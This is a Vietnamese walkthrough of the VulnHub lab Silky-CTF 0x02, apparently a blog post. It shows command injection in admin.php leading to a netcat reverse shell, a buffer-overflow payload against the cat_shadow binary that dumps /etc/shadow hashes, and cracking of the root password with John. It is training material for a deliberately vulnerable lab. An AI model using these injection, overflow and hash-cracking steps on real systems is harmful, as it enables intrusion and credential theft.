## Mở đầu
- Lại là mình đây, vẫn là cái serie vào `/root` để lấy cờ :joy_cat::joy_cat::joy_cat:. Vẫn là mấy bài lab trên VulnHub.com. Lần này sẽ là một bài khá đơn giản về lỗi Buffer OverFlow.
- [Silky-CTF: 0x02](https://www.vulnhub.com/entry/silky-ctf-0x02,307/), Link bài lab, các bạn có thể tải về và build nó lên rồi làm thử nhé. Nếu mà chưa làm được hay bí bách chỗ nào thì kéo xuống dưới nè. Mình hint cho :D
## Tấn công
- Vẫn như thường lệ, build lab lên rồi phải dò IP của bài lab bằng `nmap` thôi. Quét ra địa chỉ `192.168.19.107` rồi. Vào trang thì thấy như này.

![](https://images.viblo.asia/0de479a0-a77e-4db2-a3c3-bd4092b4608e.png)

- Sử dụng dirb quét thử xem trang có gì không.

![](https://images.viblo.asia/31abb9b4-d4e7-4ff3-bd54-7522697b6562.png)

- Có trang `/admin.php`, vào thôi.

![](https://images.viblo.asia/ea7f7a16-4d30-4a59-9309-13219793a3f7.png)

- Thử login với `Username = admin && Password = admin`
- `URl:http://192.168.19.107/admin.php?username=admin&password=admin`. Ồ, trang web sử dụng phương thức GET để lấy user và pass. 
- Sau khi thử một hồi các lỗi cơ bản thì phát hiện ra web này dính lỗi `Commandline Injection`, thử truyền `ls` vào ô `username` ta được hình bên dưới

![](https://images.viblo.asia/078386f3-45a5-434d-9c23-8db82506e32a.png)

- Thực hiện `Remote Shell` qua thôi, đầu tiên ở máy mình gõ lệnh `nc -lvp 5000` để lắng nghe tất cả cổng 5000 truyền đến.
- Ở bên máy victim thì truyền vào như sau

![](https://images.viblo.asia/087cba26-9fb4-410d-9fad-14e7ba95a7f8.png)

![](https://images.viblo.asia/bf9c29f0-b751-4577-a498-38804968f3f0.png)

- Ok rồi, ta đã remote được, sau một hồi xem xét, bị vài cú lừa thì cũng lấy được 1 em flag ở`/home/silky`

![](https://images.viblo.asia/e353c18c-f9e0-4c5c-bfb4-77e24f5b2153.png)

- Trong folder này thấy một file `cat_shadow` nữa, tải về máy mình xem. Run lên thì được như vầy.

    ```bash
    root@kali:~# ./cat_shadow 
    cat_shadow: 
    Usage: cat_shadow <Password> 
    ```
- Humm, thử truyền vài thứ vào xem.
    ```bash
    root@kali:~# ./cat_shadow AAAA
    Trying to cat /etc/shadow
     Permisson denied! 
     0x00000000 != 0x496c5962
    ```
- Hình như cái lỗi Buffer OverFlow, truyền nhiều nhiều một chút xem nào
    ```bash
    root@kali:~# ./cat_shadow $(python -c "print('A'*30)")
    Trying to cat /etc/shadow
     Permisson denied! 
     0x00000000 != 0x496c5962
    ```
- Chưa được, nhiều nữa xem thế nào.
    ```bash
    root@kali:~# ./cat_shadow $(python -c "print('A'*70)")
    Trying to cat /etc/shadow
     Permisson denied! 
     0x41414141 != 0x496c5962
    ```
- Ăn rồi, sau một hồi thử thì nó bị dính ở 64, mình truyền cái chuỗi nó yêu cầu vào thôi 
    ```bash
    root@kali:~# ./cat_shadow $(python -c "print('A'*64+'\x62\x59\x6c\x49')")
    Trying to read /etc/shadow
    Succes
    Printing...
    root:$6$qvhlqI7I$//0whlOY9i55tzFatxkzafR7n7KA2P2nRh7kMSo82KrGV89ujtSTPEJOQjXsRGpSEFuFKnCT0a0.g92kCstOP1:17938:0:99999:7:::
    ```
- Nhưng đây là đang ăn ở bên máy mình, phải run ở trên máy của victim chớ.
    ```bash
    www-data@Silky-CTF0x02:/home/silky$ ./cat_shadow $(python -c "print('A'*64+'\x62\x59\x6c\x49')")
    <dow $(python -c "print('A'*64+'\x62\x59\x6c\x49')")
    Trying to read /etc/shadow
    Succes
    Printing...
    root:$6$L69RL59x$ONQl06MP37LfjyFBGlQ5TYtdDqEZEe0yIZIuTHASQG/dgH3Te0fJII/Wtdbu0PA3D/RTxJURc.Ses60j0GFyF/:18012:0:99999:7:::
    silky:$6$F0T5vQMg$BKnwGPZ17UHvqZLOVFVCUh6CrsZ5Eu8BLT1/uX3h44wtEoDt9qA2dYL04CMUXHw2Km9H.tttNiyaCHwQQ..2T0:18012:0:99999:7:::
    ```
    (Sorry nó dài quá mình cắt bớt lấy mấy thứ quan trọng thôi)
- Silky thì mình có rồi, giờ lấy quyền root thôi. Sử dụng công cụ `John` có trong Kali để Brute Force mật khẩu.
    ```bash
    root@kali:~# john crack.txt --wordlist=/usr/share/wordlists/rockyou.txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
    Cost 1 (iteration count) is 5000 for all loaded hashes
    Will run 4 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    greygrey         (root)
    1g 0:00:02:28 DONE (2019-06-18 09:22) 0.006716g/s 2070p/s 2070c/s 2070C/s guners..googleplex
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed
    ```
- Vậy ta lấy được mật khẩu `root` rồi, là `greygrey`, switch sang tài khoản `root` rồi chụp cờ cuối thôi.
    ```bash
    root@Silky-CTF0x02:/# cd /root
    cd /root
    root@Silky-CTF0x02:~# ls
    ls
    flag.txt
    root@Silky-CTF0x02:~# cat flag.txt
    cat flag.txt
    ███████╗██╗██╗     ██╗  ██╗██╗   ██╗      ██████╗████████╗███████╗    ██████╗ ██╗  ██╗ ██████╗ ██████╗ 
    ██╔════╝██║██║     ██║ ██╔╝╚██╗ ██╔╝     ██╔════╝╚══██╔══╝██╔════╝   ██╔═████╗╚██╗██╔╝██╔═████╗╚════██╗
    ███████╗██║██║     █████╔╝  ╚████╔╝█████╗██║        ██║   █████╗     ██║██╔██║ ╚███╔╝ ██║██╔██║ █████╔╝
    ╚════██║██║██║     ██╔═██╗   ╚██╔╝ ╚════╝██║        ██║   ██╔══╝     ████╔╝██║ ██╔██╗ ████╔╝██║██╔═══╝ 
    ███████║██║███████╗██║  ██╗   ██║        ╚██████╗   ██║   ██║███████╗╚██████╔╝██╔╝ ██╗╚██████╔╝███████╗
    ╚══════╝╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝         ╚═════╝   ╚═╝   ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝

    Fun Fact:
    Um ein Kilogramm Rohseide zu gewinnen, werden bis zu zehn Kilogramm Kokons benötigt.

    Glückwunsch :)
    Flag:d1f258a6ec26dffbbdec79f68890a5e8
    ```
## Tổng kết
- Một bài CTF đơn giản về web và buffer overflow cho các bạn thử. Goodluck :D